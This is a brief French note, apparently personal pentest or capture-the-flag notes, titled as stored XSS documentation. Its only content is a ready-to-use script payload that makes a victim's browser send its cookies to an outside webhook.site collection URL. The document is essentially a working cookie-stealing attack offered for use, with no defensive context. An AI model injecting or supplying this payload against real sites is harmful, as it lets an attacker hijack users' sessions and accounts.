# Documentation XSS stockée

## Récuperation cookie
```shell
<script>
document.write('<img src="https://webhook.site/9c7694db-3d13-407b-8d0c-d1a52bb5737d?cookie=' + document.cookie + '" />');
</script>
```
